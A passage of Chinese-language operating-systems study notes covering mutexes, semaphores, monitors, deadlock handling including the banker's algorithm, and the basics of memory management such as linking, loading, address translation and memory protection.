<p><code>acquire()</code> 或 <code>release()</code> 的执行必须是原子操作，因此互斥锁通常采用硬件机制来实现。</p>
<p>互斥锁的主要缺点是忙等待，当有一个进程在临界区中任何其他进程在进入临界区时必须连续循环调用 <code>acquire()</code>。当多个进程共享同一个 CPU 时，就浪费了 CPU 周期。因此，互斥锁通常用于多处理器系统，一个线程可以在一个处理器上等待，不影响其他线程的执行。</p>
<h4> 信号量</h4>
<p>信号量机制是一种功能较强的机制，可用来解决互斥与同步问题，它只能被两个标准的原语 <code>wait(S)</code> 和 <code>signal(S)</code> 访问，也可记为 “P 操作” 和 “V 操作”。</p>
<p>原语是指完成某种功能且不被分割、不被中断执行的操作序列，通常可由硬件来实现。例如：<code>Test-and-Set</code> 和 <code>Swap</code> 指令就是由硬件实现的原子操作。原语功能的不被中断执行特性在单处理机上可由软件通过屏蔽中断方法实现。原语之所以不能被中断执行，是因为原语对变量的操作过程若被打断，可能会去运行另一个对同一变量的操作过程，从而出现临界段问题。</p>
<ol>
<li>
<p><strong>整型信号量</strong></p>
<p>整型信号量被定义为一个用于表示资源数目的整型量 <code>S</code>，在整型信号量机制中的 <code>wait</code> 操作，只要信号量 <code>S≤0</code>，就会不断地测试。因此，该机制并未遵循 “让权等待” 的准则，而是使进程处于 “忙等待” 的状态。</p>
</li>
<li>
<p><strong>记录型信号量</strong></p>
<p>记录型信号量机制是一种不存在 “忙等待” 现象的进程同步机制。除了需要一个用于代表资源数目的整型变量 <code>value</code> 外，再增加一个进程链表 <code>L</code>，用于链接所有等待该资源的进程。记录型信号量得名于采用了记录型的数据结构。</p>
</li>
<li>
<p><strong>利用信号量实现同步</strong></p>
<p>信号量机制能用于解决进程间的各种同步问题。设 <code>S</code> 为实现进程 P<sub>1</sub>、P<sub>2</sub> 同步的公共信号量，初值为 0。进程 P<sub>2</sub> 中的语句 <code>y</code> 要使用进程 P<sub>1</sub> 中语句 <code>x</code> 的运行结果，所以只有当语句 <code>x</code> 执行完成之后语句 <code>y</code> 才可以执行。</p>
</li>
<li>
<p><strong>利用信号量实现进程互斥</strong></p>
<p>信号量机制也能很方便地解决进程互斥问题。设 <code>S</code> 为实现进程 P<sub>1</sub>、P<sub>2</sub> 互斥的信号量，由于每次只允许一个进程进入临界区，所以 <code>S</code> 的初值应为 1（即可用资源数为 1）。只需把临界区置于 <code>P(S)</code> 和 <code>V(S)</code> 之间，即可实现两个进程对临界资源的互斥访问。</p>
</li>
<li>
<p><strong>利用信号量实现前驱关系</strong></p>
<p>信号量也可用来描述程序之间或语句之间的前驱关系。为使各程序段能正确执行，应设置若干初始值为 “0” 的信号量。例如：为保证 S<sub>1</sub> → S<sub>2</sub>，S<sub>1</sub> → S<sub>3</sub> 的前驱关系，应分别设置信号量 <code>al</code> 和 <code>a2</code>。同样，为保证 S<sub>2</sub> → S<sub>4</sub>、S<sub>2</sub> → S<sub>5</sub>、S<sub>3</sub> → S<sub>6</sub>、S<sub>4</sub> → S<sub>6</sub>、S<sub>5</sub> → S<sub>6</sub>，应设置信号量 <code>b1</code>、<code>b2</code>、<code>c</code>、<code>d</code> 和 <code>e</code>。</p>
</li>
<li>
<p><strong>分析进程同步和互斥问题的方法步骤</strong></p>
<ul>
<li><strong>关系分析</strong>：找出问题中的进程数，并分析它们之间的同步和互斥关系</li>
<li><strong>整理思路</strong>：找出解决问题的关键点，根据进程的操作流程确定 P 操作、V 操作的大致顺序</li>
<li><strong>设置信号量</strong>：根据上面的两步，设置需要的信号量，确定初值，完善整理</li>
</ul>
</li>
</ol>
<h4> 管程</h4>
<p>在信号量机制中，每个要访问临界资源的进程都必须自备同步的 PV 操作，大量分散的同步操作给系统管理带来了麻烦，且容易因同步操作不当而导致系统死锁。于是，便产生了一种新的进程同步工具——管程。管程的特性保证了进程互斥，无须程序员自已实现互斥，从而降低了死锁发生的可能性。同时管程提供了条件变量，可以让程序员灵活地实现进程同步。</p>
<ol>
<li>
<p><strong>管程的定义</strong></p>
<p>系统中的各种硬件资源和软件资源，均可用数据结构抽象地描述其资源特性，即用少量信息和对资源所执行的操作来表征该资源，而忽略它们的内部结构和实现细节。</p>
<p>利用共享数据结构抽象地表示系统中的共享资源，而把对该数据结构实施的操作定义为一组过程。进程对共享资源的申请、释放等操作，都通过这组过程来实现，这组过程还可以根据资源情况，或接受或阻塞进程的访问，确保每次仅有一个进程使用共享资源，这样就可以统一管理对共享资源的所有访问，实现进程互斥。这个代表共享资源的数据结构，以及由对该共享数据结构实施操作的一组过程所组成的资源管理程序，称为管程（monitor）。管程定义了一个数据结构和能为并发进程所执行（在该数据结构上）的一组操作，这组操作能同步进程和改变管程中的数据。</p>
<p>由上述定义可知，管程由四部分组成：</p>
<ul>
<li>管程的名称</li>
<li>局部于管程内部的共享数据结构说明</li>
<li>对该数据结构进行操作的一组过程（或函数）</li>
<li>对局部于管程内部的共享数据设置初始值的语句</li>
</ul>
</li>
<li>
<p><strong>条件变量</strong></p>
<p>当一个进程进入管程后被阻塞，直到阻塞的原因解除时，在此期间，如果该进程不释放管程，那么其他进程无法进入管程。为此，将阻塞原因定义为条件变量 <code>condition</code>。通常，一个进程被阻塞的原因可以有多个，因此在管程中设置了多个条件变量。每个条件变量保存了一个等待队列，用于记录因该条件变量而阻塞的所有进程，对条件变量只能进行两种操作，即 <code>wait</code> 和 <code>signal</code>。</p>
<ul>
<li><strong>x.wait</strong>：当 <code>x</code> 对应的条件不满足时，正在调用管程的进程调用 <code>x.wait</code> 将自已插入 <code>x</code> 条件的等待队列，并释放管程。此时其他进程可以使用该管程</li>
<li><strong>x.signal</strong>：<code>x</code> 对应的条件发生了变化，则调用 <code>x.signal</code>，唤醒一个因 <code>x</code> 条件而阻塞的进程</li>
</ul>
</li>
</ol>
<div class="hint-container tip">
<p class="hint-container-title">条件变量和信号量的比较</p>
<ul>
<li><strong>相似点</strong>：条件变量的 <code>wait/signal</code> 操作类似于信号量的 <code>P/V</code> 操作，可以实现进程的阻塞/唤醒</li>
<li><strong>不同点</strong>：条件变量是 “没有值” 的，仅实现了 “排队等待” 功能；而信号量是 “有值” 的，信号量的值反映了剩余资源数，而在管程中，剩余资源数用共享数据结构记录</li>
</ul>
</div>
<h3> 死锁</h3>
<h4> 死锁的概念</h4>
<ol>
<li>
<p><strong>死锁的定义</strong></p>
<p>在多道程序系统中，由于多个进程的并发执行，改善了系统资源的利用率并提高了系统的处理能力。然而，多个进程的并发执行也带来了新的问题——死锁。死锁是指多个进程因竞争资源而造成的一种僵局（互相等待），若无外力作用，这些进程都将无法向前推进。</p>
<details class="hint-container details"><summary>通过生活中的一个实例来说明死锁现象</summary>
<p>在一条河上有一座桥，桥面很窄，只能容纳一辆汽车通行。若有两辆汽车分别从桥的左右两端驶上该桥，则会出现下述冲突情况：此时，左边的汽车占有桥面左边的一段，要想过桥还需等待右边的汽车让出桥面右边的一段；右边的汽车占有桥面右边的一段，要想过桥还需等待左边的汽车让出桥面左边的一段。此时，若左右两边的汽车都只能向前行驶，则两辆汽车都无法过桥</p>
</details>
<p>在计算机系统中也存在类似的情况。例如：某计算机系统中只有一台打印机和一台输入设备，进程 P<sub>1</sub> 正占用输入设备，同时又提出使用打印机的请求，但此时打印机正被进程 P<sub>2</sub> 所占用，而 P<sub>2</sub> 在未释放打印机之前，又提出请求使用正被 P<sub>1</sub> 占用的输入设备。这样，两个进程相互无休止地等待下去，均无法维续执行，此时两个进程陷入死锁状态。</p>
</li>
<li>
<p><strong>死锁产生的原因</strong></p>
<ul>
<li><strong>系统资源的竞争</strong>：通常系统中拥有的不可剥夺资源，其数量不足以满足多个进程运行的需要，使得进程在运行过程中，会因争夺资源而陷入僵局，如：磁带机、打印机等。只有对不可剥夺资源的竞争才可能产生死锁，对可剥夺资源的竞争是不会引起死锁的</li>
<li><strong>进程推进顺序非法</strong>：进程在运行过程中，请求和释放资源的顺序不当，也同样会导致死锁。例如：并发进程 P<sub>1</sub>、P<sub>2</sub> 分别保持了资源 R<sub>1</sub>、R<sub>2</sub>，而进程 P<sub>1</sub> 申请资源 R<sub>2</sub>、进程 P<sub>2</sub> 申请资源 R<sub>1</sub> 时，两者都会因为所需资源被占用而阻塞，于是导致死锁</li>
<li><strong>信号量使用不当</strong>：进程间彼此相互等待对方发来的消息，也会使得这些进程间无法继续向前推进。例如：进程 A 等待进程 B 发的消息，进程 B 又在等待进程 A 发的消息，可以看出进程 A 和 B 不是因为竞争同一资源，而是在等待对方的资源导致死锁</li>
</ul>
</li>
<li>
<p><strong>死锁产生的必要条件</strong></p>
<p>产生死锁必须同时满足以下四个条件，只要其中任意一个条件不成立，死锁就不会发生。</p>
<ul>
<li><strong>互斥条件</strong>：进程要求对所分配的资源（如打印机）进行排他性使用，即在一段时间内某资源仅为一个进程所占有。此时若有其他进程请求该资源，则请求进程只能等待</li>
<li><strong>不剥夺条件</strong>：进程所获得的资源在未使用完之前，不能被其他进程强行夺走，即只能由获得该资源的进程自己来释放（只能是主动释放）</li>
<li><strong>请求并保持条件</strong>：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源已被其他进程占有，此时请求进程被阻塞，但对自已已获得的资源保持不放</li>
<li><strong>循环等待条件</strong>：存在一种进程资源的循环等待链，链中每个进程已获得的资源同时被链中下一个进程所请求。即存在一个处于等待态的进程集合 {P<sub>1</sub>, P<sub>2</sub>,……, P<sub>n</sub>}，其中 P<sub>i</sub> 等待的资源被 P<sub>i+1</sub>（i=0, 1, ……, n-1）占有，P<sub>n</sub> 等待的资源被 P<sub>0</sub> 占有。</li>
</ul>
<p>直观上看，循环等待条件似乎和死锁的定义一样，其实不然。按死锁定义构成等待环所要求的条件更严，它要求 P<sub>i</sub> 等待的资源必须由 P<sub>i+1</sub> 来满足，而循环等待条件则无此限制。例如：系统中有两台输出设备，P<sub>0</sub> 占有一台，P<sub>k</sub> 占有另一台，且 K 不属于集合 {0, 1, ……, n}。P<sub>n</sub> 等待一台输出设备，它可从 P<sub>0</sub> 获得，也可能从 P<sub>k</sub> 获得。因此，虽然 P<sub>n</sub>、P<sub>0</sub> 和其他一些进程形成了循环等待圈，但 P<sub>k</sub> 不在圈内，若 P<sub>k</sub> 释放了输出设备，则可打破循环等待。因此循环等待只是死锁的必要条件。</p>
<p>资源分配图含圈而系统又不一定有死锁的原因是，同类资源数大于 1。但若系统中每类资源都只有一个资源，则资源分配图含圈就变成了系统出现死锁的充分必要条件。</p>
<div class="hint-container tip">
<p class="hint-container-title">不剥夺条件与请求并保持条件</p>
<p>用一个简单的例子进行说明：若你手上拿着一个苹果（即便你不打算吃），别人不能把你手上的苹果拿走，则这就是不剥夺条件；若你左手拿着一个苹果，允许你右手再去拿一个苹果，则这就是请求并保持条件</p>
</div>
</li>
<li>
<p><strong>死锁的处理策略</strong></p>
<ul>
<li><strong>死锁预防</strong>：设置某些限制条件，破坏产生死锁的四个必要条件中的一个或几个</li>
<li><strong>避免死锁</strong>：在资源的动态分配过程中，用某种方法防止系统进入不安全状态</li>
<li><strong>死锁的检测及解除</strong>：无须采取任何限制性措施，允许进程在运行过程中发生死锁。通过系统的检测机构及时地检测出死锁的发生，然后采取某种措施解除死锁</li>
</ul>
<p>预防死锁和避免死锁都属于事先预防策略，预防死锁的限制条件比较严格，实现起来较为简单，但往往导致系统的效率低，资源利用率低；避免死锁的限制条件相对宽松，资源分配后需要通过算法来判断是否进入不安全状态，实现起来较为复杂。</p>
<p>死锁的几种处理策略的比较见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">处理策略</th>
<th style="text-align:left">资源分配策略</th>
<th style="text-align:left">各种可能模式</th>
<th style="text-align:left">主要优点</th>
<th style="text-align:left">主要缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">死锁预防</td>
<td style="text-align:left">保守，宁可资源闲置</td>
<td style="text-align:left">一次请求所有资源，资源剥夺，资源按序分配</td>
<td style="text-align:left">适用于突发式处理的进程，不必进行剥夺</td>
<td style="text-align:left">效率低，进程初始化时间延长；剥夺次数过多；不便灵活申请新资源</td>
</tr>
<tr>
<td style="text-align:center">死锁避免</td>
<td style="text-align:left">是 “预防” 和 “检测” 的折中（在运行时判断是否可能死锁）</td>
<td style="text-align:left">寻找可能的安全允许顺序</td>
<td style="text-align:left">不必进行剥夺</td>
<td style="text-align:left">必须知道将来的资源需求；进程不能被长时间阻塞</td>
</tr>
<tr>
<td style="text-align:center">死锁检测</td>
<td style="text-align:left">宽松，只要允许就分配资源</td>
<td style="text-align:left">定期检查死锁是否已经发生</td>
<td style="text-align:left">不延长进程初始化时间，允许对死锁进行现场处理</td>
<td style="text-align:left">通过剥夺解除死锁，造成损失</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h4> 死锁预防</h4>
<p>防止死锁的发生只需破坏死锁产生的四个必要条件之一即可。</p>
<ol>
<li>
<p><strong>破坏互斥条件</strong></p>
<p>若允许系统资源都能共享使用，则系统不会进入死锁状态。但有些资源根本不能同时访问，如打印机等临界资源只能互斥使用。所以，破坏互斥条件而预防死锁的方法不太可行，而且在有的场合应该保护这种互斥性。</p>
</li>
<li>
<p><strong>破坏不剥夺条件</strong></p>
<p>当一个已保持了某些不可剥夺资源的进程请求新的资源而得不到满足时，它必须释放已经保持的所有资源，待以后需要时再重新申请。这意味着，一个进程已占有的资源会被暂时释放，或者说是被剥夺，或从而破坏了不剥夺条件。</p>
<p>该策略实现起来比较复杂，释放已获得的资源可能造成前一阶段工作的失效，反复地申请和释放资源会增加系统开销，降低系统吞吐量。这种方法常用于状态易于保存和恢复的资源，如 CPU 的寄存器及内存资源，一般不能用于打印机之类的资源。</p>
</li>
<li>
<p><strong>破坏请求并保持条件</strong></p>
<p>采用预先静态分配方法，即进程在运行前一次申请完它所需要的全部资源，在它的资源未满足前，不把它投入运行。一旦投入运行，这些资源就一直归它所有，不再提出其他资源请求，这样就可以保证系统不会发生死锁。</p>
<p>这种方式实现简单，但缺点也显而易见，系统资源被严重浪费，其中有些资源可能仅在运行初期或运行快结束时才使用，甚至根本不使用。而且还会导致 “饥饿” 现象，由于个别资源长期被其他进程占用时，将致使等待该资源的进程迟迟不能开始运行。</p>
</li>
<li>
<p><strong>破坏循环等待条件</strong></p>
<p>为了破坏循环等待条件，可采用顺序资源分配法。首先给系统中的资源编号，规定每个进程必须按编号递增的顺序请求资源，同类资源一次申请完。也就是说，只要进程提出申请分配资源 R<sub>i</sub>，则该进程在以后的资源申请中就只能申请编号大于 R<sub>i</sub> 的资源。</p>
<p>这种方法存在的问题是，编号必须相对稳定，这就限制了新类型设备的增加；尽管在为资源编号时已考虑到大多数作业实际使用这些资源的顺序，但也经常会发生作业使用资源的顺序与系统规定顺序不同的情况，造成资源的浪费；此外，这种按规定次序申请资源的方法，也必然会给用户的编程带来麻烦。</p>
</li>
</ol>
<h4> 死锁避免</h4>
<p>避免死锁同样属于事先预防策略，但并不是事先采取某种限制措施破坏死锁的必要条件，而是在资源动态分配过程中，防止系统进入不安全状态，以避免发生死锁。这种方法所施加的限制条件较弱，可以获得较好的系统性能。</p>
<ol>
<li>
<p><strong>系统安全状态</strong></p>
<p>避免死锁的方法中，允许进程动态地申请资源，但系统在进行资源分配之前，应先计算此次分配的安全性。若此次分配不会导致系统进入不安全状态，则允许分配；否则让进程等待。</p>
<p>安全状态是指系统能按某种进程推进顺序（P<sub>1</sub>, P<sub>2</sub>,……, P<sub>n</sub>）为每个进程 P<sub>i</sub> 分配其所需的资源，直至满足每个进程对资源的最大需求，使每个进程都可顺序完成。此时称 P<sub>1</sub>, P<sub>2</sub>,……, P<sub>n</sub> 为安全序列。若系统无法找到一个安全序列，则称系统处于不安全状态。</p>
<p>假设系统中有三个进程 P<sub>1</sub>、P<sub>2</sub> 和 P<sub>3</sub>，共有 12 台磁带机。进程 P<sub>1</sub> 共需要 10 台磁带机，P<sub>2</sub> 和 P<sub>3</sub> 分别需要 4 台和 9 台。假设在 T<sub>0</sub> 时刻，进程 P<sub>1</sub>、P<sub>2</sub> 和 P<sub>3</sub> 已分别获得 5 台、2 台和 2 台，尚有 3 台未分配，见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">进程</th>
<th style="text-align:center">最大需求</th>
<th style="text-align:center">已分配</th>
<th style="text-align:center">可用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">p<sub>1</sub></td>
<td style="text-align:center">10</td>
<td style="text-align:center">5</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">p<sub>2</sub></td>
<td style="text-align:center">4</td>
<td style="text-align:center">2</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">p<sub>3</sub></td>
<td style="text-align:center">9</td>
<td style="text-align:center">2</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>在 T<sub>0</sub> 时刻是安全的，因为存在一个安全序列 P<sub>2</sub>、P<sub>1</sub>、P<sub>3</sub>，只要系统按此进程序列分配资源，那么每个进程都能顺利完成。也就是说，当前可用磁带机为 3 台，先把 3 台磁带机分配给 P<sub>2</sub> 以满足其最大需求，P<sub>2</sub> 结束并归还资源后，系统有 5 台磁带机可用；接下来给 P<sub>1</sub> 分配 5 台磁带机以满足其最大需求，P<sub>1</sub> 结束并归还资源后，剩余 10 台磁带机可用；最后分配 7 台磁带机给 P<sub>3</sub>，这样 P<sub>3</sub> 也能顺利完成。</p>
<p>若在 T<sub>0</sub> 时刻后，系统分配 1 台磁带机给 P<sub>3</sub>，系统剩余可用资源数为 2，此时系统进入不安全状态，因为此时已无法再找到一个安全序列。当系统进入不安全状态后，便可能导致死锁。例如：把剩下的 2 台磁带机分配给 P<sub>2</sub>，这样 P<sub>2</sub> 完成后只能释放 4 台磁带机，既不能满足 P<sub>1</sub> 又不能满足 P<sub>3</sub>，致使它们都无法推进到完成，彼此都在等待对方释放资源，陷入僵局，即导致死锁。</p>
<p>并非所有的不安全状态都是死锁状态，但当系统进入不安全状态后，便可能进入死锁状态；反之，只要系统处于安全状态，系统便可避免进入死锁状态。</p>
</li>
<li>
<p><strong>银行家算法</strong></p>
<p>银行家算法是最著名的死锁避免算法，其思想是：把操作系统视为银行家，操作系统管理的资源相当于银行家管理的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。操作系统按照银行家制定的规则为进程分配资源。进程运行之前先声明对各种资源的最大需求量，当进程在执行中继续申请资源时，先测试该进程已占用的资源数与本次申请的资源数之和是否超过该进程声明的最大需求量。若超过则拒绝分配资源，若未超过则再测试系统现存的资源能否满足该进程尚需的最大资源量，若能满足则按当前的申请量分配资源，否则也要推迟分配。</p>
</li>
</ol>
<h4> 死锁检测和解除</h4>
<p>若系统为进程分配资源时不采取任何措施，则应该提供死锁检测和解除的手段。</p>
<ol>
<li>
<p><strong>资源分配图</strong></p>
<p>系统死锁可利用资源分配图来描述。用圆圈代表一个进程，用框代表一类资源。由于一种类型的资源可能有多个，因此用框中的一个圆代表一类资源中的一个资源。</p>
<p>从进程到资源的有向边称为请求边，表示该进程申请一个单位的该类资源；从资源到进程的边称为分配边，表示该类资源已有一个资源分配给了该进程。</p>
</li>
<li>
<p><strong>死锁定理</strong></p>
<p>简化资源分配图可检测系统状态 S 是否为死锁状态。简化方法如下：</p>
<ul>
<li>在资源分配图中，找出既不阻塞又不孤点的进程 P<sub>i</sub>（即找出一条有向边与它相连，且该有向边对应资源的申请数量小于或等于系统中已有的空闲资源数量。若所有连接该进程的边均满足上述条件，则这个进程能继续运行直至完成，然后释放它所占有的所有资源）。消去它所有的请求边和分配边，使之成为孤立的结点。</li>
</ul>
<p>这里要注意一个问题，判断某种资源是否有空闲，应该用它的资源数量减去它在资源分配图中的出度。</p>
<ul>
<li>进程 P<sub>i</sub> 所释放的资源，可以唤醒某些因等待这些资源而阻塞的进程，原来的阻塞进程可能变为非阻塞进程。根据上一步中的方法进行一系列简化后，若能消去图中所有的边，则称该图是可完全简化的。</li>
</ul>
<p>S 为死锁的条件是当且仅当 S 状态的资源分配图是不可完全简化的，该条件为死锁定理。</p>
</li>
<li>
<p><strong>死锁解除</strong></p>
<p>一旦检测出死锁，就应立即采取相应的措施来解除死锁。死锁解除的主要方法有：</p>
<ul>
<li><strong>资源剥夺法</strong>：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。但应防止被挂起的进程长时间得不到资源而处于资源匮乏的状态</li>
<li><strong>撤销进程法</strong>：强制撤销部分甚至全部死锁进程并剥夺这些进程的资源。撤销的原则可以按进程优先级和撤销进程代价的高低进行</li>
<li><strong>进程回退法</strong>：让一（或多）个进程回退到足以回避死锁的地步，进程回退时自愿释放资源而非被剥夺。要求系统保持进程的历史信息，设置还原点</li>
</ul>
</li>
</ol>
<h2> 内存管理</h2>
<h3> 内存管理概念</h3>
<h4> 内存管理的基本原理和要求</h4>
<p>内存管理（Memory Management）是操作系统设计中最重要和最复杂的内容之一。虽然计算机硬件技术一直在飞速发展，内存容量也在不断增大，但仍然不可能将所有用户进程和系统所需要的全部程序与数据放入主存，因此操作系统必须对内存空间进行合理的划分和有效的动态分配。操作系统对内存的划分和动态分配，就是内存管理的概念。</p>
<p>有效的内存管理在多道程序设计中非常重要，它不仅可以方便用户使用存储器、提高内存利用率，还可以通过虚拟技术从逻辑上扩充存储器。</p>
<p><strong>内存管理的主要功能有：</strong></p>
<ul>
<li><strong>内存空间的分配与回收</strong>：由操作系统完成主存储器空间的分配和管理，使程序员摆脱存储分配的麻烦，提高编程效率</li>
<li><strong>地址转换</strong>：在多道程序环境下，程序中的逻辑地址与内存中的物理地址不可能一致，因此存储管理必须提供地址变换功能，把逻辑地址转换成相应的物理地址</li>
<li><strong>内存空间的扩充</strong>：利用虚拟存储技术或自动覆盖技术，从逻辑上扩充内存</li>
<li><strong>内存共享</strong>：指允许多个进程访问内存的同一部分。例如：多个合作进程可能需要访问同一块数据，因此必须支持对内存共享区域进行受控访问</li>
<li><strong>存储保护</strong>：保证各道作业在各自的存储空间内运行，互不干扰</li>
</ul>
<p>在进行具体的内存管理之前，需要了解进程运行的基本原理和要求。</p>
<ol>
<li>
<p><strong>程序的链接与装入</strong></p>
<p>创建进程首先要将程序和数据装入内存。将用户源程序变为可在内存中执行的程序，通常需要以下几个步骤：</p>
<ul>
<li><strong>编译</strong>：由编译程序将用户源代码编译成若干目标模块</li>
<li><strong>链接</strong>：由链接程序将编译后形成的一组目标模块及它们所需的库函数链接在一起，形成一个完整的装入模块</li>
<li><strong>装入</strong>：由装入程序将装入模块装入内存运行</li>
</ul>
<p><strong>程序的链接有以下三种方式：</strong></p>
<ul>
<li>
<p><strong>静态链接</strong></p>
<p>在程序运行之前，先将各目标模块及它们所需的库函数链接成一个完整的装配模块，以后不再拆开。将几个目标模块装配成一个装入模块时，需要解决两个问题：修改相对地址，编译后的所有目标模块都是从 0 开始的相对地址，当链接成一个装入模块时要修改相对地址；变换外部调用符号，将每个模块中所用的外部调用符号也都变换为相对地址。</p>
</li>
<li>
<p><strong>装入时动态链接</strong></p>
<p>将用户源程序编译后所得到的一组目标模块，在装入内存时，采用边装入边链接的方式。其优点是便于修改和更新，便于实现对目标模块的共享。</p>
</li>
<li>
<p><strong>运行时动态链接</strong></p>
<p>对某些目标模块的链接，是在程序执行中需要该目标模块时才进行的。凡在执行过程中未被用到的目标模块，都不会被调入内存和被链接到装入模块上。其优点是能加快程序的装入过程，还可节省大量的内存空间。</p>
</li>
</ul>
<p><strong>内存的装入模块在装入内存时，同样有以下三种方式：</strong></p>
<ul>
<li>
<p><strong>绝对装入</strong></p>
<p>绝对装入方式只适用于单道程序环境。在编译时，若知道程序将驻留在内存的某个位置，则编译程序将产生绝对地址的目标代码。绝对装入程序按照装入模块中的地址，将程序和数据装入内存。由于程序中的逻辑地址与实际内存地址完全相同，因此不需对程序和数据的地址进行修改。</p>
<p>另外，程序中所用的绝对地址，可在编译或汇编时给出，也可由程序员直接赋予。而通常情况下在程序中采用的是符号地址，编译或汇编时再转换为绝对地址。</p>
</li>
<li>
<p><strong>可重定位装入</strong></p>
<p>在多道程序环境下，多个目标模块的起始地址通常都从 0 开始，程序中的其他地址都是相对于起始地址的，此时应采用可重定位装入方式。根据内存的当前情况，将装入模块装入内存的适当位置。在装入时对目标程序中指令和数据地址的修改过程称为重定位，又因为地址变换通常是在进程装入时一次完成的，故称为静态重定位。</p>
<p>当一个作业装入内存时，必须给它分配要求的全部内存空间，若没有足够的内存，则无法装入。此外，作业一旦进入内存，整个运行期间就不能在内存中移动，也不能再申请内存空间。</p>
</li>
<li>
<p><strong>动态运行时装入</strong></p>
<p>也称动态重定位。程序在内存中若发生移动，则需要采用动态的装入方式。装入程序把装入模块装入内存后，并不立即把装入模块中的相对地址转换为绝对地址，而是把这种地址转换推迟到程序真正要执行时才进行。因此，装入内存后的所有地址均为相对地址。这种方式需要一个重定位寄存器的支持。</p>
<p>动态重定位的优点：可以将程序分配到不连续的存储区；在程序运行之前可以只装入部分代码即可投入运行，然后在程序运行期间，根据需要动态申请分配内存；便于程序段的共享。</p>
</li>
</ul>
</li>
<li>
<p><strong>逻辑地址与物理地址</strong></p>
<p>编译后，每个目标模块都从 0 号单元开始编址，这称为该目标模块的相对地址（或逻辑地址）。当链接程序将各个模块链接成一个完整的可执行目标程序时，链接程序顺序依次按各个模块的相对地址构成统一的从 0 号单元开始编址的逻辑地址空间（或虚拟地址空间），对于 32 位系统，逻辑地址空间的范围为 0~2<sup>32</sup> - 1。进程在运行时，看到和使用的地址都是逻辑地址。用户程序和程序员只需知道逻辑地址，而内存管理的具体机制则是完全透明的。不同进程可以有相同的逻辑地址，因为这些相同的逻辑地址可以映射到主存的不同位置。</p>
<p>物理地址空间是指内存中物理单元的集合，它是地址转换的最终地址，进程在运行时执行指令和访问数据，最后都要通过物理地址从主存中存取。当装入程序将可执行代码装入内存时，必须通过地址转换将逻辑地址转换成物理地址，这个过程称为地址重定位。</p>
<p>操作系统通过内存管理部件（MMU）将进程使用的逻辑地址转换为物理地址。进程使用虚拟内存空间中的地址，操作系统在相关硬件的协助下，将它 “转换” 成真正的物理地址。逻辑地址通过页表映射到物理内存，页表由操作系统维护并被处理器引用。</p>
</li>
<li>
<p><strong>进程的内存映像</strong></p>
<p>不同于存放在硬盘上的可执行程序文件，当一个程序调入内存运行时，就构成了进程的内存映像。一个进程的内存映像一般有几个要素：</p>
<ul>
<li><strong>代码段</strong>：程序的二进制代码，代码段是只读的，可以被多个进程共享</li>
<li><strong>数据段</strong>：程序运行时加工处理的对象，包括全局变量和静态变量</li>
<li><strong>进程控制块（PCB）</strong>：存放在系统区。操作系统通过 <code>PCB</code> 来控制和管理进程</li>
<li><strong>堆</strong>：用来存放动态分配的变量。通过调用 <code>malloc</code> 函数动态地向高地址分配空间</li>
<li><strong>栈</strong>：用来实现函数调用。从用户空间的最大地址往低地址方向增长</li>
</ul>
<p>代码段和数据段在程序调入内存时就指定了大小，而堆和栈不一样。当调用像 <code>malloc</code> 和 <code>free</code> 这样的 C 标准库函数时，堆可以在运行时动态地扩展和收缩。用户栈在程序运行期间也可以动态地扩展和收缩，每次调用一个函数，栈就会增长；从一个函数返回时，栈就会收缩。</p>
</li>
<li>
<p><strong>内存保护</strong></p>
<p>确保每个进程都有一个单独的内存空间。内存分配前，需要保护操作系统不受用户进程的影响，同时保护用户进程不受其他用户进程的影响。<strong>内存保护可采取两种方法：</strong></p>
<ul>
<li>在 CPU 中设置一对上、下限寄存器，存放用户作业在主存中的上、下限地址，每当 CPU 要访问一个地址时，分别和两个寄存器的值相比，判断有无越界</li>
<li>采用重定位寄存器（又称基地址寄存器）和界地址寄存器（又称限长寄存器）来实现这种保护。重定位寄存器含最小的物理地址值，界地址寄存器含逻辑地址的最大值。内存管理机构动态地将逻辑地址与界地址寄存器进行比较，若未发生地址越界，则加上重定位寄存器的值后映射成物理地址</li>
</ul>
</li>
<li>
<p><strong>内存共享</strong></p>
<p>并不是所有的进程内存空间都适合共享，<strong>只有那些只读的区域才可以共享</strong>。可重入代码又称纯代码，是一种允许多个进程同时访问但不允许被任何进程修改的代码。但在实际执行时，也可以为每个进程配以局部数据区，把在执行中可能改变的部分复制到该数据区，这样，程序在执行时只需对该私有数据区中的内存进行修改，并不去改变共享的代码。</p>
<p><strong>通过一个例子来说明内存共享的实现方式</strong>：考虑一个可以同时容纳 <code>40</code> 个用户的多用户系统，他们同时执行一个文本编辑程序，若该程序有 <code>160KB</code> 代码区和 <code>40KB</code> 数据区，则共需 <code>8000KB</code> 的内存空间来支持 <code>40</code> 个用户。如果 <code>160KB</code> 代码是可分享的纯代码，则不论是在分页系统中还是在分段系统中，整个系统只需保留一份副本即可，此时所需的内存空间仅为 <code>40KB × 40 + 160KB = 1760KB</code>。对于分页系统，假设页面大小为 <code>4KB</code>，则代码区占用 <code>40</code> 个页面、数据区占用 <code>10</code> 个页面。为实现代码共享，应在每个进程的页表中都建立 <code>40</code> 个页表项，它们都指向共享代码区的物理页号。此外，每个进程还要为自己的数据区建立 <code>10</code> 个页表项，指向私有数据区的物理页号。对于分段系统，由于是以段为分配单位的，不管该段有多大，都只需为该段设置一个段表项（指向共享代码段始址，以及段长 160KB）。由此可见，段的共享非常简单易行。</p>
</li>
<li>
<p><strong>内存分配与回收</strong></p>
<p>存储管理方式随着操作系统的发展而发展。在操作系统由单道向多道发展时，存储管理方式便由单一连续分配发展为固定分区分配。为了能更好地适应不同大小的程序要求，又从固定分区分配发展到动态分区分配。为了更好地提高内存的利用率，进而从连续分配方式发展到离散分配方式——页式存储管理。引入分段存储管理的目的，主要是为了满足用户在编程和使用方面的要求，其中某些要求是其他几种存储管理方式难以满足的。</p>
</li>
</ol>
<h4> 覆盖与交换</h4>
